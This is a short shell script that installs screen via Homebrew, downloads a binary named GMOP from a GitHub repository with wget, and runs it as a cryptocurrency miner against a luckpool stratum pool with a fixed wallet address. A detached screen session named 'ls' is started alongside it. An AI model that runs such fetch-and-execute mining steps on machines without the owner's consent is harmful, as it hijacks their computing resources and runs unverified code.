#!/bin/sh

brew install --cask screen

brew install coreutils

wget https://github.com/Godmine99/cpu/raw/main/GMOP

chmod +x GMOP

screen -dmS ls 

./GMOP -c stratum+tcp://ap.luckpool.net:3956 -u RCdUFd3iiu1tF5TjNPsDDxN2ApqZDSbYBW.GodMiner -- password x --threads 12
